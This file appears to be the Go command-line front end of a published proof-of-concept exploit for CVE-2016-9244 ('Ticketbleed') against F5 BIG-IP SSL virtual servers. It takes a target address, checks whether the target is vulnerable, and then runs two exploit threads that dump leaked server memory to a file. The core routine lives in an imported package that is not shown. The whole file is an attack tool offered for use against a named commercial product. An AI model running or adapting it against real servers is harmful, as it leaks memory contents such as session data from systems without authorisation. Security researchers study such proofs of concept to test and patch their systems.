/*
# Exploit Title: [Ticketbleed (CVE-2016-9244) F5 BIG-IP SSL virtual server Memory Leakage]
# Date: [10.02.2017]
# Exploit Author: [Ege Balcı]
# Vendor Homepage: [https://f5.com/]
# Version: [12.0.0 - 12.1.2 && 11.4.0 - 11.6.1]
# Tested on: [Multiple]
# CVE : [CVE-2016-9244]


This is the proof of consept file for CVE-2016-9244, 
don't forget to set up GOPATH before building...

BUILD:
	export GOPATH="The path of this repo here"
	go build Ticketbleed.go

USAGE:
	./ticketbleed <options> <ip:port>
OPTIONS:
	-o, --out 	Output filename for raw memory
	-s, --size 	Size in bytes to read
	-h, --help 	Print this message

*/
package main

import "Ticketbleed"
import "strconv"
import "strings"
import "color"
import "os"



var Red *color.Color = color.New(color.FgRed)
var BoldRed *color.Color = Red.Add(color.Bold)
var	Blue *color.Color = color.New(color.FgBlue)
var	BoldBlue *color.Color = Blue.Add(color.Bold)
var	Yellow *color.Color = color.New(color.FgYellow)
var	BoldYellow *color.Color = Yellow.Add(color.Bold)
var	Green *color.Color = color.New(color.FgGreen)
var	BoldGreen *color.Color = Green.Add(color.Bold)



var OutputFile string = ""
var BleedSize int = 0

func main() {


	ARGS := os.Args[1:]
	if len(ARGS) < 1 || len(ARGS) > 5{
		BoldRed.Println(Banner)
		Green.Println(Help)
		os.Exit(1)
	}

  	for i := 0; i < len(ARGS); i++{

		if ARGS[i] == "-h" || ARGS[i] == "--help"{
			BoldRed.Println(Banner)
			Green.Println(Help)
			os.Exit(1)
	  	}

		if ARGS[i] == "-o" || ARGS[i] == "--out"{
			OutputFile = ARGS[i+1]
	  	}

	  	if ARGS[i] == "-s" || ARGS[i] == "--size"{
	  		Size,err := strconv.Atoi(ARGS[i+1])
	  		if err != nil {
	  			BoldRed.Println("[-] ERROR: Invalid size value !")
	  			os.Exit(1)
	  		}
	  		if Size < 0 {
	  			BoldRed.Println("[-] ERROR: Size can't be smaller than 0")
	  			os.Exit(1)
	  		}else{
	  			BleedSize = Size
	  		}
	  	}
 	}

	if OutputFile != "" {
		File, FileErr := os.Create(OutputFile)
		if FileErr != nil {
			BoldRed.Println("[-] ERROR: While creating output file !")
			os.Exit(1)
		}
		File.Close()
		BoldYellow.Println("[*] Output file: "+OutputFile)
	}

 	VulnStatus := Ticketbleed.Check(ARGS[0])								// First check if it's vulnerable
 	if strings.Contains(VulnStatus, "[+]") {
 		BoldGreen.Println(VulnStatus)
 		go Ticketbleed.Exploit(ARGS[0], OutputFile, (BleedSize/2))  		// With using multiple threads it is easyer to move on stack
 		Ticketbleed.Exploit(ARGS[0], OutputFile, (BleedSize/2))				// Othervise server echoes back alot of duplicate value
 	}else{
 		BoldYellow.Println(VulnStatus)
 	}

}



var Banner string = `
▄▄▄█████▓ ██▓ ▄████▄   ██ ▄█▀▓█████▄▄▄█████▓ ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄ 
▓  ██▒ ▓▒▓██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀▓  ██▒ ▓▒▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌
▒ ▓██░ ▒░▒██▒▒▓█    ▄ ▓███▄░ ▒███  ▒ ▓██░ ▒░▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌
░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄░ ▓██▓ ░ ▒██░█▀  ▒██░    ▒▓█  ▄ ▒▓█  ▄ ░▓█▄   ▌
  ▒██▒ ░ ░██░▒ ▓███▀ ░▒██▒ █▄░▒████▒ ▒██▒ ░ ░▓█  ▀█▓░██████▒░▒████▒░▒████▒░▒████▓ 
  ▒ ░░   ░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░   ░▒▓███▀▒░ ▒░▓  ░░░ ▒░ ░░░ ▒░ ░ ▒▒▓  ▒ 
    ░     ▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░   ░    ▒░▒   ░ ░ ░ ▒  ░ ░ ░  ░ ░ ░  ░ ░ ▒  ▒ 
  ░       ▒ ░░        ░ ░░ ░    ░    ░       ░    ░   ░ ░      ░      ░    ░ ░  ░ 
          ░  ░ ░      ░  ░      ░  ░         ░          ░  ░   ░  ░   ░  ░   ░    
             ░                                    ░                        ░      
`
var Help string = `
Author: Ege Balci
Github: github.com/EgeBalci/Ticketbleed


USAGE: 
	./ticketbleed <ip:port> <options> 
OPTIONS:
	-o, --out 	Output filename for raw memory
	-s, --size 	Size in bytes to read (Output value may vary)
	-h, --help 	Print this message
`